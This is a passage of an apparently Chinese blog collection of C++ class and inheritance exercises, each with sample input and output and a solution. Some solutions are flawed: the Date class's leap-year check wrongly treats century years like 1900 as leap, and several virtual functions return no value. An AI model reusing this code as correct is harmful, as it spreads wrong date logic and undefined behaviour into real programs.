如果创建成功输出：registration complete。
如果长度不合法输出：illegal length。
若长度不合法且字符也不合法输出：illegal length。
如果字符不合法输出：illegal charactor。
如果用户名已存在输出：acount existed。

# 样例输入输出
样例1
输入:
5
1
abcd
abcdef
abcdef
abc1ef
输出:
illegal length
illegal length
registration complete
acount existed
illegal charactor
</code></pre>
<p>只要长度不合法 -&gt; illegal length<br>
长度合法 但是字符不合法 -&gt; illegal charactor<br>
用户名存在 -&gt; acount existed</p>
<pre><code class="language-c++">#include &lt;bits/stdc++.h&gt;

using namespace std;

class Solution {
public:
    static void run() {
        int n; cin &gt;&gt; n;
        vector&lt;string&gt; inputStr(n);
        set&lt;string&gt; st;
        for (int i = 0; i &lt; n; i++)
            cin &gt;&gt; inputStr[i];

        for (int i = 0; i &lt; n; i++) {
            if (inputStr[i].size() &lt; 6 || inputStr[i].size() &gt; 12) { cout &lt;&lt; &quot;illegal length&quot; &lt;&lt; endl; continue; }
            bool flag = false;
            for (const auto &amp; chr : inputStr[i]) {
                if ((chr &gt;= 'a' &amp;&amp; chr &lt;= 'z') || (chr &gt;= 'A' &amp;&amp; chr &lt;= 'Z'))
                    continue;
                cout &lt;&lt; &quot;illegal charactor&quot; &lt;&lt; endl; flag = true; break;
            }
            if (flag) continue;
            if (st.find(inputStr[i]) == st.end()) { cout &lt;&lt; &quot;registration complete&quot; &lt;&lt; endl; st.insert(inputStr[i]); }
            else cout &lt;&lt; &quot;acount existed&quot; &lt;&lt; endl;
        }
    }
};

int main () {
    Solution::run();
    return 0;
}
</code></pre>
<h1 id="类与对象的定义">类与对象的定义</h1>
<pre><code class="language-Markdown"># 题目描述
要求设计一个立方体类（Cube）

成员变量有：长（length）、宽（width）、高（height），都为int类型；

成员方法有：输入输出函数、获取表面积的方法（getArea），获取体积的方法（getVolume）。

输入描述：输入立方体的长、宽、高

输出描述：输出立方体的长、宽、高、面积、体积

要求：长宽高均为整数类型，输入/输出的各项之间使用空格隔开。

# 样例输入输出
样例1
输入:
3 4 5
输出:
3 4 5 94 60
</code></pre>
<pre><code class="language-c++">#include &lt;bits/stdc++.h&gt;

using namespace std;

class Cube {
private:
    int length, width, height;

public:
    void Input() {
        cin &gt;&gt; length &gt;&gt; width &gt;&gt; height;
    }

    int getArea() {
        return (length * width + width * height + height * length) * 2;
    }

    int getVolume() {
        return length * width * height;
    }

    void Output() {
        cout &lt;&lt; length &lt;&lt; &quot; &quot; &lt;&lt; width &lt;&lt; &quot; &quot; &lt;&lt; height &lt;&lt; &quot; &quot; &lt;&lt; getArea() &lt;&lt; &quot; &quot; &lt;&lt; getVolume() &lt;&lt; endl;
    }
};

int main () {
    auto cube = Cube();
    cube.Input();
    cube.Output();
    return 0;
}
</code></pre>
<h1 id="类和对象删除链表的重复节点">类和对象：删除链表的重复节点</h1>
<pre><code class="language-Markdown"># 题目描述
给定一个随机长度的数值数组，要求构造成链表并删除其中有重复的元素，使每个元素只出现一次。返回删除好的链表。按输入顺序，删除第一次之后出现的结点，按原顺序返回

输入描述：输入一系列数值，不一定有序

输出描述：删除重复结点后的链表。

# 样例输入输出
样例1
输入:
1 5 3 1 9
输出:
1 5 3 9
</code></pre>
<pre><code class="language-c++">#include &lt;bits/stdc++.h&gt;

using namespace std;

typedef struct Node {
    int val;
    Node * next;
    Node(int x) : val(x), next(nullptr) {}
    Node(int x, Node * n) : val(x), next(n) {}
} Node;

class Solution {
private:
    set&lt;int&gt; se;

public:
    void Run() {
        // Prepare numbers of link list.
        string str; getline(cin, str);
        stringstream ss(str);
        string subStr;
        vector&lt;int&gt; vec;
        while (getline(ss, subStr, ' '))
            vec.push_back(stoi(subStr));

        // Use set to erase repeated elements.
        Node * head = new Node(-1);
        Node * p = head;
        for (const auto &amp; i : vec) {
            if (se.find(i) != se.end()) continue;
            se.insert(i);
            p-&gt;next = new Node(i);
            p = p-&gt;next;
        }
        for (Node * i = head; i-&gt;next != nullptr; i = i-&gt;next)
            cout &lt;&lt; i-&gt;next-&gt;val &lt;&lt; &quot; &quot;;
    }
};

int main () {
    Solution().Run();
    return 0;
}
</code></pre>
<h1 id="类和对象运算符重载">类和对象：运算符重载</h1>
<pre><code class="language-Markdown"># 题目描述
定义一个日期类Date，包含年、月、日三个数据成员，请实现重载自增运算符（++），实现日期的自增。

输入描述：2020 11 11，对应年，月，日
输出描述：2020 年11月12日，对应明天的年，月，日
需要注意特殊情况比如（月末，年末，平年，闰年判断）例如：
输入：2020 12 31
输出：2021年1月1日

# 样例输入输出
样例1
输入:
2021 12 11
输出:
2021年12月12日
</code></pre>
<pre><code class="language-c++">#include &lt;bits/stdc++.h&gt;

using namespace std;

class Date {
private:
    int year;
    int month;
    int day;
    vector&lt;int&gt; mon30 = {4, 6, 9, 11};
    vector&lt;int&gt; mon31 = {1, 3, 5, 7, 8, 10};

    void dateCheck() {
        // Special Case: 2月份 闰年 平年
        if (month == 2) {
            if ((year % 100 == 0 &amp;&amp; year % 400 == 0) || (year % 4 == 0)) {
                if (day &gt; 29) { month++; day %= 29; return; }
            } else {
                if (day &gt; 28) { month++; day %= 28; return; }
            }
        }
        // Special Case: 31天的月份 30天的月份
        if (month == 12) {
            if (day &gt; 31) { year++; month = 1; day %= 31; return; }
        }
        if (find(mon30.begin(), mon30.end(), month) != mon30.end()) {
            if (day &gt; 30) { month++; day %= 30; return; }
        }
        if (find(mon31.begin(), mon31.end(), month) != mon31.end()) {
            if (day &gt; 31) { month++; day %= 31; return; }
        }
    }

public:
    Date(int y, int m, int d) : year(y), month(m), day(d) {}

    void operator++(int) {
        day++;
        dateCheck();
    }

    void Print() const {
        cout &lt;&lt; year &lt;&lt; &quot;年&quot; &lt;&lt; month &lt;&lt; &quot;月&quot; &lt;&lt; day &lt;&lt; &quot;日&quot; &lt;&lt; endl;
    }
};

int main() {
    int y, m, d; cin &gt;&gt; y &gt;&gt; m &gt;&gt; d;
    Date dt = Date(y, m, d);
    dt++;
    dt.Print();

    return 0;
}
</code></pre>
<h1 id="类和对象对象数组">类和对象：对象数组</h1>
<pre><code class="language-Markdown"># 题目描述
构建一个Book类，有4个私有数据成员：书名、作者、qu和price（均为int型），将qu进行初始化，
同时price被始化为qu的10倍。建立一个有5个元素的对象数组，顺序显示每个对象数组中元素的信息；
定义对象指针，通过指针访问对象数组，逆序显示对象数组中元素的信息。书名、作者、qu的信息从键盘输入

输入描述： 5个对象数组元素的值 
输出描述： 顺序显示对象数组中各对象的值 ，各参数中间以空格隔开
				 逆序显示对象数组中各对象的值 ，各参数中间以空格隔开

# 样例输入输出
## 样例1
输入:
C语言程序设计 苏小红 2
C++程序设计 刘丽华 3
Python机器学习 范淼 4
数据结构与算法 徐凤生 3
大话数据结构 程杰 2
输出:
书名：C语言程序设计 作者：苏小红 价格：20
书名：C++程序设计 作者：刘丽华 价格：30
书名：Python机器学习 作者：范淼 价格：40
书名：数据结构与算法 作者：徐凤生 价格：30
书名：大话数据结构 作者：程杰 价格：20
使用指针逆序显示的结果为
书名：大话数据结构 作者：程杰 价格：20
书名：数据结构与算法 作者：徐凤生 价格：30
书名：Python机器学习 作者：范淼 价格：40
书名：C++程序设计 作者：刘丽华 价格：30
书名：C语言程序设计 作者：苏小红 价格：20
</code></pre>
<pre><code class="language-c++">#include &lt;bits/stdc++.h&gt;

using namespace std;

class Book {
private:
    string name;
    string author;
    int qu;
    int price;

public:
    Book(string nm, string auth, int qu) : name(std::move(nm)), author(std::move(auth)), qu(qu), price(qu*10) {}

    void Print() const {
        cout &lt;&lt; &quot;书名：&quot; &lt;&lt; name &lt;&lt; &quot; &quot; &lt;&lt; &quot;作者：&quot; &lt;&lt; author &lt;&lt; &quot; &quot; &lt;&lt; &quot;价格：&quot; &lt;&lt; price &lt;&lt; endl;
    }
};

int main() {
    vector&lt;Book&gt; books;
    for (int i = 0; i &lt; 5; i++) {
        string name;
        string author;
        int qu;
        cin &gt;&gt; name &gt;&gt; author &gt;&gt; qu;
        books.emplace_back(name, author, qu);
    }

    // Print out 5 books.
    for (const auto &amp; book : books)
        book.Print();
    reverse(books.begin(), books.end());
    cout &lt;&lt; &quot;使用指针逆序显示的结果为&quot; &lt;&lt;  endl;
    for (const auto &amp; book : books)
        book.Print();

    return 0;
}
</code></pre>
<h1 id="类和对象多继承">类和对象：多继承</h1>
<pre><code class="language-Markdown"># 题目描述
1、定义日期“Date”类，类中包含数据成员年、月、日，成员函数包括构造函数（只有带参的构造函数），设置日期函数，显示日期函数
2、定义时间“Time”类，数据成员包括时、分、秒。成员函数的要求与date类相同
3、定义日期时间型“Date_Time”类
⑴公有继承Date类及Time类；
⑵不增加数据成员；
⑶增加日期时间处理成员函数，包括初始化日期时间、设置日期时间、显示日期时间等。
4、每个类都要求重载&gt;&gt; 和&lt;&lt;运算符用于对日期时间的输入和输出
5.对Date_Time，重载&gt;运算符，用于判断两个时间大小。
6. 编写main()函数进行测试。在主函数中，输入两个Date_Time类的数据，对两个日期时间进行比较，输出较小的一个。

# 样例输入输出
样例1
输入:
2022 4 16 18 30 31 2022 4 16 18 30 35
输出:
2022-4-16 18:30:31
</code></pre>
<pre><code class="language-c++">#include &lt;bits/stdc++.h&gt;

using namespace std;

class Date {
public:
    int year;
    int month;
    int day;

public:
    Date(int y, int m, int d) : year(y), month(m), day(d) {};

    friend ostream &amp; operator&lt;&lt;(ostream &amp; output, const Date &amp; date) {
        output &lt;&lt; to_string(date.year) + &quot;-&quot; + to_string(date.month) + &quot;-&quot; + to_string(date.day);
        return output;
    }

    friend istream &amp; operator&gt;&gt;(istream &amp; input, Date &amp; date) {
        input &gt;&gt; date.year &gt;&gt; date.month &gt;&gt; date.day;
        return input;
    }
};

class Time {
public:
    int hour;
    int minute;
    int second;

public:
    Time(int h, int m, int s) : hour(h), minute(m), second(s) {};

    friend ostream &amp; operator&lt;&lt;(ostream &amp; output, const Time &amp; time) {
        output &lt;&lt; to_string(time.hour) + &quot;:&quot; + to_string(time.minute) + &quot;:&quot; + to_string(time.second);
        return output;
    }

    friend istream &amp; operator&gt;&gt;(istream &amp; input, Time &amp; time) {
        input &gt;&gt; time.hour &gt;&gt; time.minute &gt;&gt; time.second;
        return input;
    }
};

class Date_Time : public Date, public Time {
public:
    Date_Time() : Date(0, 0, 0), Time(0, 0, 0) {}
    Date_Time(int y, int m, int d, int h, int min, int s) : Date(y, m, d), Time(h, min, s) {}

    friend ostream &amp; operator&lt;&lt;(ostream &amp; output, const Date_Time &amp; dateTime) {
        output &lt;&lt; to_string(dateTime.year) + &quot;-&quot; + to_string(dateTime.month) + &quot;-&quot; + to_string(dateTime.day);
        output &lt;&lt; &quot; &quot;;
        output &lt;&lt; to_string(dateTime.hour) + &quot;:&quot; + to_string(dateTime.minute) + &quot;:&quot; + to_string(dateTime.second);
        return output;
    }

    friend istream &amp; operator&gt;&gt;(istream &amp; input, Date_Time &amp; dateTime) {
        input &gt;&gt; dateTime.year &gt;&gt; dateTime.month &gt;&gt; dateTime.day;
        input &gt;&gt; dateTime.hour &gt;&gt; dateTime.minute &gt;&gt; dateTime.second;
        return input;
    }

    bool operator&gt;(Date_Time &amp; time2) {
        if (this-&gt;year &lt; time2.year) return false;
        else if (this-&gt;year &gt; time2.year) return true;
        if (this-&gt;month &lt; time2.month) return false;
        else if (this-&gt;month &gt; time2.month) return true;
        if (this-&gt;day &lt; time2.day) return false;
        else if (this-&gt;day &gt; time2.day) return true;
        if (this-&gt;hour &lt; time2.hour) return false;
        else if (this-&gt;hour &gt; time2.hour) return true;
        if (this-&gt;minute &lt; time2.minute) return false;
        else if (this-&gt;minute &gt; time2.minute) return true;
        if (this-&gt;second &lt; time2.second) return false;
        else if (this-&gt;second &gt; time2.second) return true;
        return false;
    }
};

int main() {
    Date_Time dateTime1, dateTime2;
    cin &gt;&gt; dateTime1 &gt;&gt; dateTime2;
    if (dateTime1 &gt; dateTime2)
        cout &lt;&lt; dateTime2;
    else
        cout &lt;&lt; dateTime1;
    return 0;
}
</code></pre>
<h1 id="类和对象继承与派生">类和对象：继承与派生</h1>
<pre><code class="language-Markdown"># 题目描述
把描述直角坐标系上的一个点类作为基类，派生出描述一条直线的类和描述一个三角形的类。定义成员函数求出两点间的距离和三角形的面积。点的坐标均为int型
提示：先定义描述点 的类Point；类Line继承自Point类，一个直线有两个端点，所以他在点类的基础上新增一组点的坐标（x2，y2）；三角形类 Triangle  再直线的基础上再新增一组点的坐标（x3，y3）求出三角形的面积。具体要求如下
（1）定义点类Point
保护数据成员 x1，y1
共有构造函数Point（int x1，int  y1）用于初始化x1，y1
（2）定义直线类Line
保护数据成员x2，y2
共有构造函数Line （ int x1，int  y1 ，int x2，int y2）用于初始化x2，y2，以及父类x1，y1
（3）定义三角形Triangle
私有数据成员 x3，y3
私有数据成员 area
共有构造函数Triangle（ int x1，int  y1 ，int x2，int y2，int x3 ，int y3） 用于初始化x3，y3 以及父类x1，y1，x2，y2
void area（）：求三角形面积的功能函数
void print（）：输出三个点的坐标和面积

输入描述：输入6个int型数值（x1，y1，x2，y2，x3，y3）
输出描述：第一行输出三个点的坐标，第二行输出面积

# 样例输入输出
样例1
输入:
1 1 4 1 4 5
输出:
(1,1)(4,1)(4,5)
6
</code></pre>
<pre><code class="language-c++">#include &lt;bits/stdc++.h&gt;

using namespace std;

class Point {
protected:
    int x1, y1;

public:
    Point(int x, int y) : x1(x), y1(y) {}
};

class Line : protected Point {
protected:
    int x2, y2;

public:
    Line(int x1, int y1, int x2, int y2) : Point(x1, y1), x2(x2), y2(y2) {}
};

class Triangle : private Line {
private:
    int x3, y3;
    double area;

public:
    Triangle(int x1, int y1, int x2, int y2, int x3, int y3) : Line(x1, y1, x2, y2), x3(x3), y3(y3), area(0) {}

    void calcArea() {
        area = abs((x1*y2 - x2*y1) + (x2*y3 - x3*y2) + (x3*y1 - x1*y3)) / 2.0;
    }

    void print() {
        cout &lt;&lt; &quot;(&quot; + to_string(x1) + &quot;,&quot; + to_string(y1) + &quot;)&quot;;
        cout &lt;&lt; &quot;(&quot; + to_string(x2) + &quot;,&quot; + to_string(y2) + &quot;)&quot;;
        cout &lt;&lt; &quot;(&quot; + to_string(x3) + &quot;,&quot; + to_string(y3) + &quot;)&quot; &lt;&lt; endl;
        cout &lt;&lt; area &lt;&lt; endl;
    }
};

int main() {
    int x1, y1, x2, y2, x3, y3;
    cin &gt;&gt; x1 &gt;&gt; y1 &gt;&gt; x2 &gt;&gt; y2 &gt;&gt; x3 &gt;&gt; y3;
    auto triangle = Triangle(x1, y1, x2, y2, x3, y3);
    triangle.calcArea();
    triangle.print();
    return 0;
}
</code></pre>
<h1 id="重载运算符练习">重载运算符练习</h1>
<pre><code class="language-Markdown"># 题目描述
定义一个RMB类Money，包括元角分三个数据成员，重载运算符'+'和'-',实现货币的加减运算。

# 例如：
输入一组元角分：
2 3 4
3 7 3
输出：
和:6元0角7分
差:-1元3角9分
</code></pre>
<pre><code class="language-c++">#include &lt;bits/stdc++.h&gt;

using namespace std;

class RMB {
protected:
    int money;

public:
    explicit RMB(int mon) : money(mon) {}

    RMB operator+(const RMB &amp; rmb) const {
        auto ret = RMB(money + rmb.money);
        return ret;
    }

    RMB operator-(const RMB &amp; rmb) const {
        auto ret = RMB(money - rmb.money);
        return ret;
    }

    void print() const {
        if (money &gt;= 0)
            cout &lt;&lt; money / 100 &lt;&lt; &quot;元&quot; &lt;&lt; (money % 100) / 10 &lt;&lt; &quot;角&quot; &lt;&lt; money % 10 &lt;&lt; &quot;分&quot;;
        else {
            int monTemp = -money;
            cout &lt;&lt; &quot;-&quot; &lt;&lt; monTemp / 100 &lt;&lt; &quot;元&quot; &lt;&lt; (monTemp % 100) / 10 &lt;&lt; &quot;角&quot; &lt;&lt; monTemp % 10 &lt;&lt; &quot;分&quot;;
        }
    }
};

int main() {
    int a, b, c;
    vector&lt;RMB&gt; rmbs;
    for (int i = 0; i &lt; 2; i++) {
        cin &gt;&gt; a &gt;&gt; b &gt;&gt; c;
        rmbs.emplace_back(RMB(a*100 + b*10 + c));
    }
    auto res1 = rmbs[0] + rmbs[1];
    auto res2 = rmbs[0] - rmbs[1];
    cout &lt;&lt; &quot;和:&quot;; res1.print(); cout &lt;&lt; endl;
    cout &lt;&lt; &quot;差:&quot;; res2.print(); cout &lt;&lt; endl;
    return 0;
}
</code></pre>
<h1 id="继承">继承</h1>
<pre><code class="language-Markdown"># 题目描述
以点（Point）类为基类，重新定义圆类（Circle）。在圆类中实现一个 isPointerInCircle方法，该方法传入一个点类对象，判断点和圆的关系，并在该方法中输出。

点类（Point）:
        成员变量：x轴坐标（int x）  y轴坐标（int y）
圆类（Circle）继承自点类（Point），以Point为圆心:
        成员变量： 半径（double radius）
        成员方法：判断点和圆关系的方法（isPointerInCircle）
点和圆的关系（最终输出为以下三种关系之一）：
        点在圆外
        点在圆上
        点在圆内

输入描述：
0 0
1 1 1.0
（第一行为要判断的点的横纵坐标，第二行前两个参数为圆的圆心坐标，第三个参数为圆的半径）
输出描述：
点在圆外

# 样例输入输出
样例1
输入:
0 0
1 1 1.0
输出:
点在圆外
</code></pre>
<pre><code class="language-c++">#include &lt;bits/stdc++.h&gt;

using namespace std;

class Point {
public:
    int x;
    int y;
    Point(int a, int b) : x(a), y(b) {}
};

class Circle : public Point {
public:
    double radius;

public:
    Circle(int a, int b, double c) : Point(a, b), radius(c) {}

    void isPointerInCircle(const Point &amp; p) const {
        double distance = sqrt(pow(fabs(x - p.x), 2) + pow(fabs(y - p.y), 2));
        if (distance - radius &gt; DBL_EPSILON)
            cout &lt;&lt; &quot;点在圆外&quot;;
        else if (distance - radius &gt;= 0 &amp;&amp; distance - radius &lt;= DBL_EPSILON)
            cout &lt;&lt; &quot;点在圆上&quot;;
        else
            cout &lt;&lt; &quot;点在圆内&quot;;
    }
};

int main() {
    int pX, pY; cin &gt;&gt; pX &gt;&gt; pY; auto p = Point(pX, pY);
    double r; cin &gt;&gt; pX &gt;&gt; pY &gt;&gt; r; auto circle = Circle(pX, pY, r);
    circle.isPointerInCircle(p);
    return 0;
}
</code></pre>
<h1 id="继承组合">继承组合</h1>
<pre><code class="language-Markdown"># 题目描述
声明Teacher（教师）类为基类，数据成员包括：姓名，性别。成员函数为构造析构函数
Professor（教授）类为Teacher类的派生类。
另有一个BirthDate（生日）类，数据成员包含year，month，day等数据成员。可以将教授的生日信息加入到Professor类的声明中作为Professor的对象成员。
在主函数中，定义Professor类对象时给定初始值，然后给定一个新的BirthDate类对象，更新原对象中的生日数据并输出。

输入描述：
第一行依次输入构造Professor对象的各项初始数据
第二行输入为新的BirthDate对象的数值
输出描述
更新原有的professor对象的birthday数据并输出

# 样例输入输出
样例1
输入:
zhangsan M 1999 7 14
2001 5 21
输出:
name: zhangsan
sex: M
birthdate: 2001/5/21
</code></pre>
<pre><code class="language-c++">#include &lt;bits/stdc++.h&gt;

using namespace std;

class Teacher {
public:
    string name;
    string gender;

public:
    Teacher(string &amp; n, string &amp; g) : name(n), gender(g) {}
};

class BirthDate {
public:
    int year;
    int month;
    int day;
    BirthDate(int y, int m, int d) : year(y), month(m), day(d) {}
};

class Professor : public Teacher {
public:
    BirthDate bd;
    Professor(string &amp; n, string &amp; g, int y, int m, int d) :
            Teacher(n, g), bd(BirthDate(y, m, d)) {}

    void print() const {
        cout &lt;&lt; &quot;name: &quot; &lt;&lt; name &lt;&lt; endl;
        cout &lt;&lt; &quot;sex: &quot;  &lt;&lt; gender &lt;&lt; endl;
        cout &lt;&lt; &quot;birthdate: &quot; &lt;&lt; bd.year &lt;&lt; &quot;/&quot; &lt;&lt; bd.month &lt;&lt; &quot;/&quot; &lt;&lt; bd.day &lt;&lt; endl;
    }
};

int main() {
    string n, g; int y, m, d;
    cin &gt;&gt; n &gt;&gt; g &gt;&gt; y &gt;&gt; m &gt;&gt; d; auto prof = Professor(n, g, y, m, d);
    cin &gt;&gt; y &gt;&gt; m &gt;&gt; d; prof.bd = BirthDate(y, m, d);
    prof.print();
    return 0;
}
</code></pre>
<h1 id="多重继承">多重继承</h1>
<pre><code class="language-Markdown"># 题目描述
分别定义Teacher(教师）类和Cadre（干部）类，采用多重继承方式由这两个类派生出新类Teacher_Cadre(教师兼干部)类。要求：
1、Teacher类中包含数据成员 姓名、年龄、性别、职称（title）。
2、Cadre类中包含数据成员 姓名、年龄、性别、职务（post）。
3、Teacher_Cadre类中还包含数据成员工资（wages）。
4.两个基类中的姓名、年龄、性别 数据成员用相同的名字，在引用这些数据成员时，指定作用域。
5、在派生类Teacher_Cadre 的成员函数show 中调用Teacher类中的display 函数,输出姓名、年龄、性别、职称，然后再用cout语句输出职务与工资。

输入描述：
输入3个教师兼干部内容分别构造3个类
输出描述：
输出工资最高的一位教师兼干部的各项信息

# 样例输入输出
样例1
输入:
zhangsan 30 M teacher assistent 3456.2
lisi 34 M professor assistent 4589.5
wangwu 56 M professor manager 8569.5
输出:
name: wangwu
age: 56
sex: M
title: professor
post: manager
wage: 8569.5
</code></pre>
<pre><code class="language-c++">#include &lt;bits/stdc++.h&gt;

using namespace std;

class Teacher {
public:
    string name;
    string gender;
    int age;
    string title;

public:
    Teacher(string &amp; n, string &amp; g, int age, string &amp; t) :
        name(n), gender(g), age(age), title(t) {}

    void display() const {
        cout &lt;&lt; &quot;name: &quot; &lt;&lt; name &lt;&lt; endl;
        cout &lt;&lt; &quot;age: &quot;  &lt;&lt; age &lt;&lt; endl;
        cout &lt;&lt; &quot;sex: &quot;  &lt;&lt; gender &lt;&lt; endl;
        cout &lt;&lt; &quot;title: &quot;&lt;&lt; title &lt;&lt; endl;
    }
};

class Cadre {
public:
    string name;
    string gender;
    int age;
    string post;
    Cadre(string &amp; n, string &amp; g, int age, string &amp; p) :
        name(n), gender(g), age(age), post(p) {}
};

class Teacher_Cadre : public Teacher, public Cadre {
public:
    double wages;

public:
    Teacher_Cadre(string &amp; n, string &amp; g, int age, string &amp; t, string &amp; p, double w) :
        Teacher(n, g, age, t), Cadre(n, g, age, p), wages(w) {}

    void show() const {
        this-&gt;Teacher::display();
        cout &lt;&lt; &quot;post: &quot; &lt;&lt; post &lt;&lt; endl;
        cout &lt;&lt; &quot;wage: &quot; &lt;&lt; wages &lt;&lt; endl;
    }
};

int main() {
    vector&lt;Teacher_Cadre&gt; people;
    string n, g, t, p; int age; double wage;
    for (int i = 0; i &lt; 3; i++) {
        cin &gt;&gt; n &gt;&gt; age &gt;&gt; g &gt;&gt; t &gt;&gt; p &gt;&gt; wage;
        people.emplace_back(Teacher_Cadre(n, g, age, t, p, wage));
    }
    // Find the highest wage.
    int ind = 0; double highest = people[0].wages;
    for (int i = 0; i &lt; people.size(); i++) {
        if (highest &lt; people[i].wages) {
            highest = people[i].wages;
            ind = i;
        }
    }
    people[ind].show();
    return 0;
}
</code></pre>
<h1 id="多态性">多态性</h1>
<pre><code class="language-Markdown"># 题目描述
完成以下代码，实现简单的计算器功能。
定义一个BaseCalculator类，包括数据成员m_A，m_B，定义成员函数为虚函数getResult()，在基类中无需实现。
定义AddCalculator，SubCalculator，MultiplicationCalculator ，DivisionCalculator为加、减、乘、除四种计算器类，继承自BaseCalculator类，并在每个类中实现getResult()方法进行不同类型的运算。
在主函数中定义一个BaseCalculator类型的指针，分别指向四种不同计算功能的四各类对象进行输出。
输入描述：输入两个整形数字m_A，m_B
输出描述：
第一行为加法结果
第二行为减法结果
第三行为乘法结果
第四行为除法结果

# 样例输入输出
样例1
输入:
6 2
输出:
8
4
12
3
</code></pre>
<pre><code class="language-c++">#include &lt;bits/stdc++.h&gt;

using namespace std;

class BaseCalculator {
protected:
    int m_A;
    int m_B;
public:
    BaseCalculator(int a, int b) : m_A(a), m_B(b) {}
    virtual int getResult() {}
};

class AddCalculator : public BaseCalculator {
public:
    AddCalculator(int i, int i1) : BaseCalculator(i, i1) {}

    int getResult() override {
        return m_A + m_B;
    }
};

class SubCalculator : public BaseCalculator {
public:
    SubCalculator(int i, int i1) : BaseCalculator(i, i1) {}

    int getResult() override {
        return m_A - m_B;
    }
};

class MultiplicationCalculator : public BaseCalculator {
public:
    MultiplicationCalculator(int i, int i1) : BaseCalculator(i, i1) {}

    int getResult() override {
        return m_A * m_B;
    }
};

class DivisionCalculator : public BaseCalculator {
public:
    DivisionCalculator(int i, int i1) : BaseCalculator(i, i1) {}

    int getResult() override {
        return m_A / m_B;
    }
};

int main() {
    int a, b; cin &gt;&gt; a &gt;&gt; b;
    BaseCalculator * baseCalc;
    baseCalc = new AddCalculator(a, b);
    cout &lt;&lt; baseCalc-&gt;getResult() &lt;&lt; endl;

    baseCalc = new SubCalculator(a, b);
    cout &lt;&lt; baseCalc-&gt;getResult() &lt;&lt; endl;

    baseCalc = new MultiplicationCalculator(a, b);
    cout &lt;&lt; baseCalc-&gt;getResult() &lt;&lt; endl;

    baseCalc = new DivisionCalculator(a, b);
    cout &lt;&lt; baseCalc-&gt;getResult() &lt;&lt; endl;
}
</code></pre>
<h1 id="虚函数">虚函数</h1>
<pre><code class="language-Markdown"># 题目描述
写一个程序，定义抽象基类Shape,由他派生出3个派生类：Circle（圆类），Rectangle（矩形），Triangle（三角形）。用虚函数分别计算几种图形的面积，并求他们的和。

输入描述:
第一行为圆的半径
第二行为矩形的长，宽
第三行为三角形的底和高

输出描述：
第一行为圆形的面积
第二行为矩形的面积
第三行为三角形的面积
第四行为三个图形面积和

# 样例输入输出
样例2
输入:
2
3 4
6 8
输出:
Circlearea=12.56
Rectanglearea=12
Trianglearea=24
Area sum=48.56
</code></pre>
<pre><code class="language-c++">#include &lt;bits/stdc++.h&gt;

using namespace std;

class Shape {
public:
    double circleRadius{};
    double recWidth{}, recHeight{};
    double triBase{}, triHeight{};

public:
    virtual double getCircleArea() {};

    virtual double getRecArea() {};

    virtual double getTriArea() {};
};

class Circle : virtual public Shape {
public:
    double getCircleArea() override {
        return 3.14 * circleRadius * circleRadius;
    }
};

class Rectangle : virtual public Shape {
public:
    double getRecArea() override {
        return recWidth * recHeight;
    }
};

class Triangle : virtual public Shape {
public:
    double getTriArea() override {
        return 0.5 * triBase * triHeight;
    }
};

int main() {
    auto circle = new Circle();
    cin &gt;&gt; circle-&gt;circleRadius;

    auto rectangle = new Rectangle();
    cin &gt;&gt; rectangle-&gt;recWidth &gt;&gt; rectangle-&gt;recHeight;

    auto triangle = new Triangle();
    cin &gt;&gt; triangle-&gt;triBase &gt;&gt; triangle-&gt;triHeight;

    cout &lt;&lt; &quot;Circlearea=&quot; &lt;&lt; circle-&gt;getCircleArea() &lt;&lt; endl;
    cout &lt;&lt; &quot;Rectanglearea=&quot; &lt;&lt; rectangle-&gt;getRecArea() &lt;&lt; endl;
    cout &lt;&lt; &quot;Trianglearea=&quot; &lt;&lt; triangle-&gt;getTriArea() &lt;&lt; endl;
    cout &lt;&lt; &quot;Area sum=&quot; &lt;&lt; circle-&gt;getCircleArea() + rectangle-&gt;getRecArea() + triangle-&gt;getTriArea() &lt;&lt; endl;
}
</code></pre>
<h1 id="字符串a">字符串A</h1>
<pre><code class="language-Markdown"># 题目描述
利用指针实现复制一个字符串的指定位数成为一个新的字符串 。例如样例输入输出中helloNKCS中，N为第6个字符，从N开始复制N及之后的NKCS作为新字符串。

输入描述：
第一行输入 复制开始的位置  ，第二行输入一个字符串

输出描述：
从开始位置截取之后的字符串作为新字符串并输出

# 样例输入输出
样例1
输入:
6
helloNKCS
输出:
NKCS
</code></pre>
<pre><code class="language-c++">#include &lt;bits/stdc++.h&gt;

using namespace std;

class Solution {
public:
    static void run() {
        int ind; cin &gt;&gt; ind;
        string s; cin &gt;&gt; s;
        for (int i = ind-1; i &lt; s.length(); i++) {
            cout &lt;&lt; s[i];
        }
    }
};

int main() {
    Solution::run();
}
</code></pre>
<h1 id="类和对象b">类和对象B</h1>
<pre><code class="language-Markdown"># 题目描述
分别定义Teacher(教师）类和Cadre（干部）类，采用多重继承方式由这两个类派生出新类Teacher_Cadre(教师兼干部)类。要求：
1、Teacher类中包含数据成员 姓名、年龄、性别、职称（title）。
2、Cadre类中包含数据成员 姓名、年龄、性别、职务（post）。
3、Teacher_Cadre类中还包含数据成员工资（wages）。
4.两个基类中的姓名、年龄、性别 数据成员用相同的名字，在引用这些数据成员时，指定作用域。
5、在派生类Teacher_Cadre 的成员函数show 中调用Teacher类中的display 函数,输出姓名、年龄、性别、职称，然后再用cout语句输出职务与工资。

输入描述：
输入3个教师兼干部内容分别构造3个类
输出描述：
输出工资最低的一位教师兼干部的各项信息，中间以空格分开

# 样例输入输出
样例1
输入:
zhangsan 30 M teacher assistent 3456.2
lisi 34 M professor assistent 4589.5
wangwu 56 M professor manager 8569.5
输出:
zhangsan 30 M teacher assistent 3456.2
</code></pre>
<pre><code class="language-c++">#include &lt;bits/stdc++.h&gt;

using namespace std;

class Teacher {
public:
    string name;
    string gender;
    int age;
    string title;

public:
    Teacher(string &amp; n, string &amp; g, int age, string &amp; t) :
            name(n), gender(g), age(age), title(t) {}

    void display() const {
//        cout &lt;&lt; &quot;name: &quot; &lt;&lt; name &lt;&lt; endl;
//        cout &lt;&lt; &quot;age: &quot;  &lt;&lt; age &lt;&lt; endl;
//        cout &lt;&lt; &quot;sex: &quot;  &lt;&lt; gender &lt;&lt; endl;
//        cout &lt;&lt; &quot;title: &quot;&lt;&lt; title &lt;&lt; endl;
        cout &lt;&lt; name &lt;&lt; &quot; &quot; &lt;&lt; age &lt;&lt; &quot; &quot; &lt;&lt; gender &lt;&lt; &quot; &quot; &lt;&lt; title &lt;&lt; &quot; &quot;;
    }
};

class Cadre {
public:
    string name;
    string gender;
    int age;
    string post;
    Cadre(string &amp; n, string &amp; g, int age, string &amp; p) :
            name(n), gender(g), age(age), post(p) {}
};

class Teacher_Cadre : public Teacher, public Cadre {
public:
